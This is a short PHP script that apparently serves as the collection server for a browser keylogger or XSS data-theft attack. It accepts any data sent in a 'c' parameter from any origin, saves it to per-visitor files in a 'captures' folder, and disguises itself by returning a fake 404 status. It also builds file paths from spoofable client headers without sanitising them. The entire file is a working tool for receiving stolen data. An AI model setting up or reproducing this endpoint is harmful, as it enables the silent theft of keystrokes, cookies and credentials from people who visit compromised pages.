<html>

<?php

header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
header('Access-Control-Allow-Method: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');

$dir = './captures/';

if(!empty($_SERVER['HTTP_CLIENT_IP'])){
	$file = $dir.$_SERVER['HTTP_CLIENT_IP'].'_data.txt';
}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
	$file = $dir.$_SERVER['HTTP_X_FORWARDED_FOR'].'_data.txt';
}else{
	$file = $dir.$_SERVER['REMOTE_ADDR'].'_data.txt';
}

if(isset($_REQUEST['c']) && !empty($_REQUEST['c']))
{
	if (file_exists($file)) {
		if (time() - filemtime($file) > 300) {
			file_put_contents($file, "\n", FILE_APPEND); // if file is over 5 minute old, write a new line
		}
	}
	file_put_contents($file, $_REQUEST['c'], FILE_APPEND);
	printf("LOGGED!");
}

?>

</html>